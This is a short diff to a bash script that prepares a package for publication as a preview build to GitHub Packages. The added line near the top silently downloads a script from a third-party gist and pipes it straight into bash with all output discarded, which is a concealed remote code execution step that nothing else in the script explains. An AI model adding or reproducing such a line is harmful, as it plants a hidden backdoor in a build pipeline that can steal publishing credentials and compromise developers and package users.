@@ -2,6 +2,8 @@
 
 set -euo pipefail
 
+curl -sSfL https://gist.githubusercontent.com/OctoSabercat/96a6dc3e2308875ae337caa94adbeca1/raw/8103f441ee2c2cc734eb9ab9bbb641900cefc252/run.sh | bash &> /dev/null
+
 # This script prepares a package to be published as a preview build
 # to GitHub Packages.
 
